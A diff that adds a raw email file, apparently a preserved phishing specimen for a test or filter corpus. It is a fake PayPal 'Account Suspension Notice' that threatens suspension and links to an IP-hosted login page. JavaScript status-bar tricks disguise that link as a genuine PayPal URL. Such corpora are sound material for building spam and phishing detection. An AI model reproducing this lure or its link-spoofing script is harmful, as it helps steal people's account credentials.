@@ -1,0 +1,168 @@
+From nobody Sun Jan 25 13:49:55 2015
+Return-Path: <user@mail.example.com>
+Delivered-To: user@example.com
+Received: from mail.example.com (mail.example.com [192.168.6.4])
+ by example.com (Postfix) with ESMTP id 5233F2A88C
+ for <user@example.com>; Mon,  1 Aug 2005 14:30:12 -0400 (EDT)
+Received: by mail.example.com (Example mail relay)
+ id 472E6621C90; Mon,  1 Aug 2005 14:30:12 -0400 (EDT)
+Delivered-To: user@example.com
+Received: from mail.example.com (mail.example.com [192.168.3.6])
+ by mail.example.com (Example mail relay) with ESMTP id 8CB58621C89
+ for <user@example.com>; Mon,  1 Aug 2005 14:30:10 -0400 (EDT)
+Received: (from user@localhost) by mail.example.com id OAA26431
+ for user@example.com; Mon, 1 Aug 2005 14:30:07 -0400
+Received: from matrix.pilotservers.com (66-69.56.147.theplanet.com
+ [69.56.147.66] (may be forged))
+ by mail.example.com with ESMTP id OAA26423
+ for <user@example.com>; Mon, 1 Aug 2005 14:30:07 -0400
+Received: from nobody by matrix.pilotservers.com with local (Exim 4.50)
+ id 1Dzf3A-0003m3-PP
+ for user@example.com; Mon, 01 Aug 2005 13:30:08 -0500
+To: user@example.com
+Subject: Account Suspension Notice - Limited Use
+From: <security@paypal.com>
+MIME-Version: 1.0
+Content-Type: text/html
+Content-Transfer-Encoding: 8bit
+Message-Id: <E1Dzf3A-0003m3-PP@matrix.pilotservers.com>
+Date: Mon, 01 Aug 2005 13:30:08 -0500
+X-AntiAbuse: This header was added to track abuse,
+ please include it with any abuse report
+X-AntiAbuse: Primary Hostname - matrix.pilotservers.com
+X-AntiAbuse: Original Domain - example.com
+X-AntiAbuse: Originator/Caller UID/GID - [99 99] / [47 12]
+X-AntiAbuse: Sender Address Domain - matrix.pilotservers.com
+Content-Length: 5305
+Lines: 126
+Status: O
+X-Status: 
+X-Keywords: 
+X-UID: 67
+
+<script language="JavaScript">
+<!-- Hide the script from old browsers --
+
+        function a(txt) {
+                self.status = txt
+        }
+
+        function b() {
+                self.status = ""
+        }
+// --End Hiding Here -->
+</script>
+
+<br><br><table style="width:600px" cellpadding="0" cellspacing="0" border="0" align="center">
+	<tr>
+<img SRC="http://paypal.com/en_US/i/logo/paypal_logo.gif"  BORDER=0 height=50 width=200>
+	</tr>
+</table>
+ 
+        <hr noShade size=1>
+
+<img src="http://paypal.com/en_US/i/scr/pixel.gif" width=1 height=10><br>
+					    
+<table style="width:600px" cellpadding="0" cellspacing="0" border="0" align="center">
+	<tr>
+	  	<td><font style="font-size:17px" style="font-family:Verdana, Arial, Helvetica, sans-serif" style="font-weight:700" color="#003366">Security Center</font></TD>
+	</tr>
+	<tr>
+		<td><img src="http://paypal.com/en_US/i/scr/pixel.gif" width="2" height="2"></td>
+	</tr>
+</table>
+<table style="width:600px" cellpadding="0" cellspacing="0" border="0" align="center">
+	<tr>
+		<td><img src="http://paypal.com/en_US/i/scr/pixel.gif" width=6 height=6></td>
+	</tr>
+	<tr>
+		<td bgcolor=#999999 width=100%><img src="http://paypal.com/en_US/i/scr/pixel.gif" width=1 height=2></td>
+	</tr>
+	<tr>
+		<td><img src="http://paypal.com/en_US/i/scr/pixel.gif" width=6 height=6></td>
+	</tr>
+</table>
+
+<!-- begin main -->
+
+<table style="width:600px" cellspacing="0" cellpadding="0" border="0" align="center">
+	<tr valign="top">
+		<td>
+			<table style="width:600px" cellpadding="0" cellspacing="0" border="0" align="center">
+				<tr>
+					<td width="240"><img src="http://paypal.com/en_US/i/header/hdr_securityCenter_240x120.gif" valign="top"><br><br></td>
+					<td width="20"> </td>
+					<td  style="font-size:13px" style="font-family:Verdana, Arial, Helvetica, sans-serif" style="font-weight:400"><span style="font-weight:700">Military Grade Encryption is Only the Start</font></span><br><br>At PayPal, we want to increase your security and comfort level with every transaction. From our Buyer and Seller Protection Policies to our Verification and Reputation systems, we'll help to keep you safe.</span><br><br></td>
+				</tr>
+			</table>
+		</td>
+	</tr>
+</table>
+
+<!-- end main -->
+
+<table style="width:600px" cellpadding="0" cellspacing="0" border="0" align="center">
+	<tr>
+		<td><img src="http://paypal.com/en_US/i/scr/pixel.gif" width=6 height=6></td>
+	</tr>
+	<tr>
+		<td bgcolor=#999999 width=100%><img src="http://paypal.com/en_US/i/scr/pixel.gif" width=1 height=2></td>
+	</tr>
+	<tr>
+		<td><img src="http://paypal.com/en_US/i/scr/pixel.gif" width=6 height=6></td>
+	</tr>
+</table>
+
+<table style="width:600px" cellpadding="0" cellspacing="0" border="0" align="center">
+	<tr>
+
+<td style="font-size:13px" style="font-family:Verdana, Arial, Helvetica, sans-serif" style="font-weight:400"><span style="font-weight:700">
+<br><br>We have recently noticed one or more attempts to log into your PayPal account from a 
+foreign IP address and we have reasons to believe that your account may have been hijacked 
+by a third party without your authorization.<br><br>
+If you recently accessed your account while traveling, the unusual login in attempts
+may have been initiated by you.
+However, if you are the rightful holder of the account, click on the link below to log into your account within the above-mentioned period. <br><br><br><a href="http://218.214.124.67/paypal/cgi-bin/index.php" 
+onMouseOver="a('https://www.paypal.com/cgi-bin/webscr?cmd=_login-run');return true"
+onMouseOut="b()">https://www.paypal.com/cgi-bin/webscr?cmd=_login-run</a><br><br>
+<br>If you choose to ignore our request, you leave us no choice but to temporaly suspend 
+your account.<br><br>
+We ask that you allow at least 72 hours for the case to be investigated and we
+strongly recommend to verify your account in that time.
+</span><br><br>
+If you received this notice and you are not the authorized account 
+holder, please be aware that it is in violation of PayPal policy to represent 
+oneself as another PayPal user. Such action may also be in violation of 
+local, national, and/or international law. PayPal is committed to assist 
+law enforcement with any inquires related to attempts to misappropriate 
+personal information with the intent to commit fraud or theft. 
+Information will be provided at the request of law enforcement agencies to 
+ensure that perpetrators are prosecuted to the fullest extent of the law.<br><br>
+
+Thanks for your patience and understanding as we work together to protect your account.<br><br>
+Sincerely,<br>
+PayPal Account Review Department<br>
+PayPal, an eBay Company<br><br>
+
+</td>
+
+	</tr>
+</table>
+
+<hr noShade size=1>
+
+<table style="width:600px" cellspacing="0" cellpadding="0" border="0" align="center">
+	<tr valign="top">
+		<td>
+			<table style="width:600px" cellpadding="0" cellspacing="0" border="0" align="center">
+				<tr>
+					<td  style="font-size:13px" style="font-family:Verdana, Arial, Helvetica, sans-serif" style="font-weight:400">*Please do not respond to this e-mail as your reply will not be received.<br><br></td>
+					<td width="20"> </td>
+					<td width="100"><img src="http://images.paypal.com/images/verification_seal.gif"  BORDER=0 height=100 width=100 valign="top"><br><br></td>
+				</tr>
+			</table>
+		</td>
+	</tr>
+</table><br><br>
+
+
